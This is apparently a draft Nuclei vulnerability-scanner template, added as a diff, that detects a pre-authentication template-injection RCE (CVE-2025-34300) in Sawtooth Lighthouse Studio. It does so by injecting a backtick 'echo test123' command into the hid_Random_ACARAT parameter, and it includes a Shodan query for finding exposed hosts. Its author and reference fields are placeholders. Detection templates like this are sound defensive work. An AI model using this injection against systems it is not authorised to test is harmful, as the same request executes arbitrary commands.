@@ -1,0 +1,79 @@
+id: cve-2025-34300
+
+info:
+  name: Sawtooth Lighthouse Studio RCE via Template Injection
+  author: YourName (adapted from Assetnote research)
+  severity: high
+  description: Detects a pre-authentication remote code execution (RCE) vulnerability in Sawtooth Lighthouse Studio (CVE-2025-34300) through template injection in the hid_Random_ACARAT parameter.
+  reference:
+    - https://example.com/assetnote-blog-post (replace with actual blog URL)
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-34300
+  classification:
+    cve-id: CVE-2025-34300
+  tags: cve,cve2025,rce,template-injection,sawtooth
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/ciwweb.pl?hid_javascript=1&hid_Random_ACARAT=[%20%60echo%20test123%60%20%]"
+    headers:
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+      Accept-Encoding: gzip, deflate, br
+      Accept-Language: en-GB,en;q=0.9
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<input type="hidden" name="hid_Random_ACARAT" value="test123">'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - 'contains(body, "hid_javascript") && contains(body, "hid_screenwidth")'
+        condition: and
+
+# Optional: Version-specific check for older 9.15.x branch
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/ciwweb.pl?hid_javascript=1&hid_Random_ACARAT=[%20%60echo%20test123%60%20%]"
+    headers:
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+      Accept-Encoding: gzip, deflate, br
+      Accept-Language: en-GB,en;q=0.9
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<input type="hidden" name="hid_Random_ACARAT" value="[ %60echo test123%60 ]">'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - 'contains(body, "hid_javascript") && contains(body, "hid_screenwidth")'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: version-hint
+        part: body
+        regex:
+          - 'Sawtooth Lighthouse Studio (9\\.15\\.[0-9]+)'
+
+metadata:
+  max-request: 2
+  verified: false
+  shodan-query: title:"Sawtooth Lighthouse Studio"
